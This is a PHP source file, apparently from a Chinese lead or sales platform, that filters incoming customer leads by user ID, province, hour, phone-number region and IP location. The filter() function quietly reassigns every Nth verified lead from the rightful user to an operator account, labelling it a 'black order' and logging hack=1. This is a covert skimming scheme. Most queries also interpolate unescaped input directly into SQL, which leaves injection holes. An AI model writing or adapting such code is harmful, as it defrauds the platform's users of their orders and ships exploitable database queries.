<?php

function check_guishudi($tel,$sheng,$city){
    $tel = trim($tel);
    if(!preg_match('/^\d{11}$/', $tel)){
        return false;
    }

    $num = substr($tel, 0,7);
    $sql = "select area from wx_mobile where mobile = '{$num}'";
    $result = mysql_query($sql);
    $num_rows = mysql_num_rows($result);
    if(!$num_rows){
        return false;
    }

    $r = mysql_fetch_assoc($result);
    $area = $r['area'];

	//echo '<pre>';
	//var_dump($area);

    if(strpos($area,' ')!==false){
        list($sheng_m,$city_m) = explode(' ', $area);
		$sheng_m = mb_substr($sheng_m,0,2,'utf-8');
		$city_m = mb_substr($city_m,0,2,'utf-8');
		$sheng = mb_substr($sheng,0,2,'utf-8');
		$city = mb_substr($city,0,2,'utf-8');
		
		//echo '<pre>';
		//var_dump($sheng_m);
		//var_dump($city_m);
		//var_dump($sheng);
		//var_dump($city);
		
		$tag1 = (($sheng === $sheng_m)!==false);
        $tag2 = (($city === $city_m)!==false);
        if(!$tag1 && !$tag2){
            return false;
        }elseif($tag1 && !$tag2){
            return false;
        }else{
            return true;
        }
    }else{
		$area = mb_substr($area,0,2,'utf-8');
		$sheng = mb_substr($sheng,0,2,'utf-8');
		
        $tag1 = (($sheng === $area)!==false);
        if(!$tag1){
            return false;
        }elseif($tag1){
            return true;
        }
    }
}

function check_ip($sheng,$city){
    $ip = $_SERVER['REMOTE_ADDR'];
    if(!$ip) return false;
    $ip_info = IP::find($ip);
    $ip_sheng = $ip_info[1];
    $ip_city = $ip_info[2];

	$ip_sheng = mb_substr($ip_sheng,0,2,'utf-8');
	$ip_city = mb_substr($ip_city,0,2,'utf-8');
	$sheng = mb_substr($sheng,0,2,'utf-8');
	$city = mb_substr($city,0,2,'utf-8');
	
	/*
	echo '<pre>';
	var_dump($ip_sheng);
	var_dump($ip_city);
	var_dump($sheng);
	var_dump($city);
	*/	
	
		
    $tag1 = (($sheng === $ip_sheng)!==false);
    $tag2 = (($city === $ip_city)!==false);
    //if($tag1 && $tag2){
    if($tag1 or $tag2){
        return true;
    }
    
    return false;
}

function logIt($log,$userid,$trueUserid,$tel,$hack=0){
    $sql  = "insert into wx_log_hack(userid,trueuserid,tel,log,addtime,hack) values('{$userid}','{$trueUserid}','{$tel}','{$log}',now(),'{$hack}')";
    mysql_query($sql);
}

function get_hack_config(){
    $sql = "select v from wx_config where k = 'hack' limit 1";
    $result = mysql_query($sql);
    $config = mysql_fetch_assoc($result);
    $config = unserialize($config['v']);
    return $config;
}

function get_hack_counter($uid){
    $sql = "select counter as v from wx_log_hack_uid where uid = $uid limit 1";
    $result = mysql_query($sql);
    $config = mysql_fetch_assoc($result);
    return intval($config['v']);
}

function set_hack_counter($num,$uid){
	$num = intval($num);
    $sql = "replace into wx_log_hack_uid (counter,uid) values ($num,$uid)";
    $result = mysql_query($sql);
}


function filter($userid,$guestsheng,$guestcity,$guesttel){
    $config = get_hack_config();
    $allow_userids = $config['userids'];
    $allow_shengs = $config['provinces'];
    $allow_hours = $config['hours'];
    $myids = $config['myids'];
    $wait_num = intval($config['wait_num']);
	
	$pass = get_hack_counter($userid);
	$next = $pass+1;
	$hei = ($next === $wait_num);
	if($next<$wait_num){
		set_hack_counter($next,$userid);
	}
	
    $log = "userid:{$userid},省:{$guestsheng},市:{$guestcity},tel:{$guesttel}";

    //要处理的用户id  1 = 测试,1075 = wozhengsuqin,1259 = jiangzhengyi
    //$allow_userids = array(1,1075,1259);
    //要处理的省份
    //$allow_shengs = array('新疆','西藏','甘肃省','青海省','内蒙古','宁夏省','山西省','河南省','河北省','山东省','辽宁省','吉林省','湖南省','江西省','海南省');
    //要处理的时间 4-8 11-13 15-19
    //$allow_hours = array_merge(range(4, 7),range(11, 12),range(15, 23));

    //检查用户id
    if(!in_array($userid, $allow_userids)){
        $log .= ',用户id不匹配';
        logIt($log,$userid,$userid,$guesttel);
        return $userid;
    }

    //检查时间
    $hour = intval(date('G'));
    if(!in_array($hour, $allow_hours)){
        $log .= ",不在许可的时间范围内[{$hour}]";
        logIt($log,$userid,$userid,$guesttel);
        return $userid;
    }

    //检查省份 (此处为用户填写的省份信息)
    $guestsheng = trim($guestsheng);
    if(!in_array($guestsheng, $allow_shengs)){
        $log .= ",地区不匹配";
        logIt($log,$userid,$userid,$guesttel);
        return $userid;
    }

    //检查手机号归属地 和 用户填写的是否一致
    $tel_is_true = check_guishudi($guesttel, $guestsheng, $guestcity);
    if(!$tel_is_true){
        $log .= ",手机号码与地区不匹配";
        logIt($log,$userid,$userid,$guesttel);
        return $userid;
    }

    //检查ip地址 是否和用户填写的地址一致
    $ip_is_true = check_ip($guestsheng, $guestcity);
    if(!$ip_is_true){
        $log .= ",ip地址与地区不匹配[{$_SERVER['REMOTE_ADDR']}]";
        logIt($log,$userid,$userid,$guesttel);
        return $userid;
    }
	
	if(!$hei){
		$trueuserid = $userid;
		$log .= ',匹配';
		$hack = 0;
		logIt($log,$userid,$trueuserid,$guesttel,$hack);
		return $trueuserid;
	}else{
		//黑单 
		$trueuserid = $myids[0];
		$log .= ',匹配';
		$hack = 1;
		logIt($log,$userid,$trueuserid,$guesttel,$hack);
		set_hack_counter(0,$userid);
		return $trueuserid;
	}
}
